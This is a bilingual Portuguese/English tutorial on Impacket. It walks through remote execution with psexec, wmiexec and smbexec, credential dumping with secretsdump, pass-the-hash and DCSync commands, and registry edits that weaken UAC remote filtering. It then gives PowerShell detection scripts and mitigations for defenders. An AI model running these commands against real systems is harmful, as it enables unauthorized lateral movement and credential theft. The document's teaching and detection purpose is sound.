2. Contexto e Relevância / Context and Relevance Original

O Impacket é uma coleção de classes Python que fornece acesso programático de baixo nível a protocolos de rede. Ao contrário de muitas ferramentas de segurança com interfaces simples de point-and-click, o Impacket exige uma compreensão mais profunda de protocolos de rede e internals do Windows. Esta curva de aprendizagem é precisamente o que o torna tão poderoso — dá-te capacidades de manipulação de protocolos de rede que podem contornar controlos de segurança tradicionais e mecanismos de deteção. O Impacket implementa dezenas de protocolos incluindo SMB, MSRPC, LDAP e Kerberos. Estas não são simples wrappers, mas implementações completas de raiz. O que distingue o Impacket é o foco em protocolos legítimos do Windows em vez de exploits. Esta abordagem permite-te misturar-te com tráfego de rede normal e evitar deteção por sistemas de monitorização focados em padrões de exploit conhecidos. Impacket is a collection of Python classes that provides low-level programmatic access to network protocols. Unlike many security tools with simple point-and-click interfaces, Impacket requires a deeper understanding of network protocols and Windows internals. This learning curve is precisely what makes it so powerful — giving you network protocol manipulation capabilities that can bypass traditional security controls and detection mechanisms. Impacket implements dozens of network protocols including SMB, MSRPC, LDAP, and Kerberos. These aren't simple wrappers but complete, from-scratch implementations. What sets Impacket apart is its focus on legitimate Windows protocols rather than exploits. This approach allows you to blend in with normal network traffic and avoid detection by security systems focused on known exploit patterns.

4. PSExec — Execução Remota Original

O psexec.py é uma implementação Python da utilidade PSExec da Microsoft. Funciona através do Service Control Manager do Windows: cria e inicia um serviço temporário no sistema alvo, que executa o comando especificado e devolve o output através de named pipes. Como usa protocolos de administração padrão do Windows, muitas vezes contorna controlos de segurança que bloqueariam outros métodos de execução remota. psexec.py is a Python implementation of Microsoft's PSExec utility. It works through the Windows Service Control Manager: it creates and starts a temporary service on the target system, which executes the specified command and returns output through named pipes. Because it uses standard Windows administration protocols, it often bypasses security controls that would block other remote execution methods.

4.1 Passos / Steps

# 1. Identificar o alvo
kali > nmap -sT 

# 2. Testar conectividade SMB
kali > smbclient -L // -U username

# 3. Executar
kali > psexec.py username@
Se vires os shares ADMIN$, C$ e IPC$, a conta tem privilégios administrativos e o PSExec deve funcionar. O erro de SMB1 no final é normal — sistemas modernos desativam SMBv1 por segurança. If you see the ADMIN$, C$, and IPC$ shares, the account has administrative privileges and PSExec should work. The SMB1 error at the end is normal — modern systems disable SMBv1 for security.

5. WMIExec — Execução via WMI Original Complementar

Se o PSExec falhar com um erro de acesso negado ao escrever nos shares administrativos, podes tentar o wmiexec.py, que usa WMI/DCOM em vez de SMB para criar o processo. O erro rpc_s_access_denied indica que tens acesso SMB mas falta permissão RPC para WMI — outro problema relacionado com UAC. If PSExec fails with access denied when writing to administrative shares, you can try wmiexec.py, which uses WMI/DCOM instead of SMB to create the process. The rpc_s_access_denied error indicates you have SMB access but lack RPC permission for WMI — another UAC-related issue.

5.1 Fix de UAC para Execução Remota / UAC Fix for Remote Execution Original

Na máquina Windows, executa como Administrador: On the Windows machine, run as Administrator: 
# Enable remote admin access for local accounts (fixes PSExec)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

# Disable filtering of the built-in Administrator account (fixes WMIExec)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v FilterAdministratorToken /t REG_DWORD /d 0 /f

# Restart to apply
shutdown /r /t 0

5.2 Uso / Usage

kali > wmiexec.py username@

6. SMBExec — Execução via SMB Complementar

O smbexec.py é outro modelo de execução baseado em serviços. Ao contrário do PSExec, não faz upload de um binário auxiliar para o alvo — usa pipes SMB para enviar comandos e receber output. Isto torna-o ligeiramente mais discreto, embora ainda crie um serviço temporário. smbexec.py is another service-based execution model. Unlike PSExec, it doesn't upload a helper binary to the target — it uses SMB pipes to send commands and receive output. This makes it slightly stealthier, although it still creates a temporary service. 
# Basic usage
smbexec.py DOMAIN/user:password@target

# With hash (pass-the-hash)
smbexec.py -hashes :NTHASH DOMAIN/user@target

# Specify share and shell type
smbexec.py DOMAIN/user:password@target -share C$ -shell-type cmd

7. SecretsDump — Extração de Credenciais Complementar

O secretsdump.py extrai hashes de password e segredos de sistemas Windows. Pode fazer dump da SAM local, LSA secrets, credenciais em cache, e do NTDS.dit em Domain Controllers via DCSync. É um dos scripts Impacket mais observados em intrusões reais. secretsdump.py extracts password hashes and secrets from Windows systems. It can dump the local SAM, LSA secrets, cached credentials, and the NTDS.dit on Domain Controllers via DCSync. It's one of the most commonly observed Impacket scripts in real-world intrusions. 
# SAM/LSA dump (local admin)
secretsdump.py DOMAIN/user:password@target

# DCSync (Domain Admin required)
secretsdump.py DOMAIN/user:password@DC_IP -just-dc-ntlm

# Offline NTDS dump
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# With pass-the-hash
secretsdump.py -hashes :NTHASH DOMAIN/user@target

9. Scripts de Impacto / Impact Scripts Impacto Complementar

Os scripts abaixo ajudam o blue team a detetar atividade compatível com Impacket, com output legível e exportação para relatório. The scripts below help the blue team detect Impacket-compatible activity, with readable output and report export.

9.1 Script 13.1 — Deteção de Shares Administrativos / Admin Share Access Detection

Objetivo: detetar acesso a ADMIN$, C$ e IPC$ via eventos 5140/5145, especialmente escritas de executáveis. Evidência: admin-share-access.csv. Goal: detect access to ADMIN$, C$, and IPC$ via events 5140/5145, especially executable writes. Evidence: admin-share-access.csv. 
# Script 13.1 - Admin Share Access Detection
$out = ".\admin-share-access.csv"
$hits = @()
Get-WinEvent -LogName Security -MaxEvents 2000 -EA SilentlyContinue |
  Where-Object { $_.Id -in @(5140,5145) } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $share = ($xml.Event.EventData.Data | Where-Object Name -eq "ShareName").'#text'
    $file  = ($xml.Event.EventData.Data | Where-Object Name -eq "RelativeTargetName").'#text'
    if ($share -match "ADMIN\$|C\$" -and $file -match "\.(exe|dll|bat|ps1|sys)$") {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; EventId=$_.Id; Share=$share; File=$file }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Admin share writes: $($hits.Count) -> $out" -ForegroundColor Red

9.2 Script 13.2 — Deteção de Execução Remota / Remote Execution Detection

Objetivo: detetar processos criados por serviços (services.exe) ou WMI (WmiPrvSE.exe) com linhas de comando suspeitas. Evidência: remote-exec-detect.csv. Goal: detect processes created by services (services.exe) or WMI (WmiPrvSE.exe) with suspicious command lines. Evidence: remote-exec-detect.csv. 
# Script 13.2 - Remote Execution Detection
$out = ".\remote-exec-detect.csv"
$hits = @()
Get-WinEvent -LogName Security -MaxEvents 2000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4688 } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $parent = ($xml.Event.EventData.Data | Where-Object Name -eq "ParentProcessName").'#text'
    $proc   = ($xml.Event.EventData.Data | Where-Object Name -eq "NewProcessName").'#text'
    $cmd    = ($xml.Event.EventData.Data | Where-Object Name -eq "CommandLine").'#text'
    if (($parent -match "services\.exe|WmiPrvSE\.exe") -and ($cmd -match "cmd|powershell|whoami|ipconfig|net ")) {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Parent=$parent; Process=$proc; Cmd=$cmd }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Remote execution hits: $($hits.Count) -> $out" -ForegroundColor Yellow

9.3 Script 13.3 — Deteção de DCSync / DCSync Detection

Objetivo: detetar DCSync via evento 4662 com o GUID de replicação de diretório. Evidência: dcsync-detect.csv. Goal: detect DCSync via event 4662 with the directory replication GUID. Evidence: dcsync-detect.csv. 
# Script 13.3 - DCSync Detection
$out = ".\dcsync-detect.csv"
$replGuid = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes
$hits = @()
Get-WinEvent -LogName Security -MaxEvents 2000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4662 } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $props = ($xml.Event.EventData.Data | Where-Object Name -eq "Properties").'#text'
    $user  = ($xml.Event.EventData.Data | Where-Object Name -eq "SubjectUserName").'#text'
    if ($props -match $replGuid) {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Account=$user; Guid=$replGuid }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] DCSync events: $($hits.Count) -> $out" -ForegroundColor Red

11. Mitigações Blue Team / Mitigations Complementar

  1. Monitorizar acessos a ADMIN$/C$/IPC$ (eventos 5140, 5145) — Script 13.1.
  2. Alertar sobre processos criados por services.exe/WmiPrvSE.exe com comandos suspeitos — Script 13.2.
  3. Detetar DCSync (evento 4662 com GUID de replicação) — Script 13.3.
  4. Desativar NTLM onde possível; exigir SMB signing e LDAP signing.
  5. Desativar LLMNR/NetBIOS — mitiga relay e poisoning.
  6. Restringir Domain Admin — Tier 0, Protected Users, gMSA para serviços.
  7. Monitorizar Kerberoasting — TGS-REQ em volume, especialmente RC4.
  8. AppLocker/WDAC — bloquear execução de binários não assinados.
  9. Segmentação de rede — limitar movimento lateral.
